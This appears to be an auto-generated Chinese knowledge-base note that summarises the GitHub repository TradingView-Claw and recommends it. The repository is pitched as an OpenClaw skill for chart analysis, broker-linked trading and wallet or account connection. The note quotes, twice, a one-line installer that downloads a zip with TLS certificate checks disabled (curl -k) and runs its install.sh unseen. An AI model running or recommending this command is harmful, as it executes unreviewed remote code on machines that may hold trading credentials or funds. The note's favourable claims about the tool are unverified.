---
repo: helenigtxu/TradingView-Claw
url: https://github.com/helenigtxu/TradingView-Claw
owner: helenigtxu
owner_type: User
language: Python
license: MIT
description: ""
homepage: ""
stars: 317
stars_per_day: 79
forks: 0
open_issues: 0
created: 2026-03-06
first_seen: 2026-03-10
week: "2026-W11"
category: "其他"
release_tag: ""
status: to-review
tags:
  - github
  - 其他
  - python
  - ai_auto_trading
  - ai_trading
  - ai_trading_bots
  - al_trading
  - bot_trading
---

# TradingView-Claw

**317** stars · **79** stars/天 · 建立 4 天前 · Python · MIT

> [!summary] 一句話摘要
> 提供交易功能的 TradingView 技能，幫助用戶進行技術分析和交易決策。

## 專案簡介

這個工具讓用戶能夠在 TradingView 上進行技術分析，並根據信號執行交易。它使用 Python 開發，並整合了多個經紀商的 API 來實現交易功能。與其他交易工具相比，它提供了 LLM 驅動的技術分析，幫助用戶更好地理解市場趨勢。這是一個適合有交易需求的用戶的實驗性工具，值得一試。

## 重點功能

- 支持根據技術信號執行交易，提供即時市場反饋。
- 集成多個經紀商的 API，方便用戶進行交易。
- 提供市場趨勢的 LLM 驅動分析，幫助用戶做出決策。
- 支持圖表瀏覽和技術指標的查詢。
- 適合教育和實驗用途，幫助用戶理解市場動態。

## 快速開始

安裝: `curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh`

## 為什麼值得關注

> [!tip] 爆紅原因
> 作者在金融科技領域有一定的背景，並且這個工具切中了交易者對於技術分析和自動交易的需求。近期市場波動加大，促使更多人尋求這類工具的幫助。

## 適合誰使用

**目標受眾**：需要進行技術分析和自動交易的金融市場參與者。

> [!example] 使用場景
> - 交易者 用它來 根據技術信號執行交易，因為它能夠自動分析市場趨勢。
> - 分析師 用它來 瀏覽和分析市場圖表，因為它提供了豐富的指標和數據。
> - 新手投資者 用它來 學習如何進行交易，因為它提供了簡單易用的介面和功能。

> [!warning] 注意事項
> 僅供教育和實驗用途，使用者需自行承擔交易風險。

## 技術細節

| 欄位 | 值 |
| --- | --- |
| 語言 | Python |
| 授權 | MIT |
| Stars | 317 |
| Forks | 0 |
| Issues | 0 |
| 建立日期 | 2026-03-06 |

> [!info]- 語言組成
> ```mermaid
> pie title 語言組成
>     "Python" : 77
>     "Shell" : 12
>     "JavaScript" : 10
> ```

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@helenigtxu](https://github.com/helenigtxu) | 3 |

## README 摘錄

> [!info]- 展開查看原文 README
> # TradingView-Claw
> 
> **Trading-enabled TradingView skill for OpenClaw.**
> 
> Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.
> 
> > **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.
> 
> ---
> 
> ## ⚡ Install on macOS — one command
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> ---
> 
> ## Features
> 
> ### Chart & Market Data
> 
> * `tvclaw charts trending` — Top trending tickers by volume
> * `tvclaw charts search "query"` — Search symbols by keyword
> * `tvclaw chart ` — Symbol details with OHLCV + indicators
> 
> ### Trading
> 
> * `tvclaw buy  ` — Open long position
> * `tvclaw sell  ` — Open short position
> * Signal-driven execution (RSI, MACD, Bollinger Bands analysis)
> 
> ### Position Tracking
> 
> * `tvclaw positions` — List open positions with live P&L
> * `tvclaw position ` — Detailed position view
> * Positions tracked locally in `~/.openclaw/tvclaw/positions.json`
> 
> ### Wallet / Account Management
> 
> * `tvclaw account status` — Show balance and account info
> * `tvclaw account connect` — Connect b

## 延伸閱讀

相關概念：#技術分析 · #自動交易 · #金融科技

[GitHub](https://github.com/helenigtxu/TradingView-Claw)

---

## 個人筆記

> [!question]+ 我的想法
> _在此寫下你的想法、使用心得、跟其他工具的比較..._

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`

## 出現記錄

- [[2026-03-10|2026-03-10]] — 首次收錄，317 stars
